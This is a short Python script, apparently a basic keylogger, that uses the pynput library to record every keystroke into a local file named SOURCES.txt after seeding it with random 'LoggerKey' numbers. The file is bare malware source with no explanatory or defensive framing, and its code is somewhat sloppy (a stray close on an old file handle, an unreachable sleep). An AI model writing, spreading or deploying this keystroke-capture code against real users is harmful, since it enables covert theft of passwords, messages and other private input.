from pynput.keyboard import Listener
from random import randint
import time

lista = []
for i in range (0,10):
    random = randint(0,10000000000)
    lista.append(random)
    arq = open('SOURCES.txt', 'a')
    arq.write(str('LoggerKey;'))
    arq.write('%d\n'%(random))
    arq.close()

output = 'SOURCES.txt'

def escreve(key):
              dig = (str(key))
              with open (output, 'a') as f:
                            f.write('%s \n'%(dig))
                            arq.close()

with Listener (on_press = escreve) as l:
              l.join()
time.sleep(10)
              
